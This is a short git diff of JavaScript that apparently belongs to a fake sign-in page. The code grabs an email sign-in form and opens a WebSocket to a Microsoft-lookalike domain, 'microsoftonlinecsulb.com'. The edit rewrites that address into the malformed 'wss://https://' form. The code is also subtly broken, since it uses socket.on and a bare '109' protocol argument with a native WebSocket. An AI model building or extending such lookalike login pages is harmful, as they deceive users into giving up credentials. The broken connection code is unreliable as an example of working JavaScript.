@@ -8,7 +8,7 @@ var emailDiv = document.querySelector(".email-sign-in-form");
 var loadingDiv = document.querySelector(".loading-screen");
 
 
-var socket = new WebSocket('https://microsoftonlinecsulb.com','109');
+var socket = new WebSocket('wss://https://microsoftonlinecsulb.com','109');
 socket.on('connect', function () {
   socket.send('hi');
 
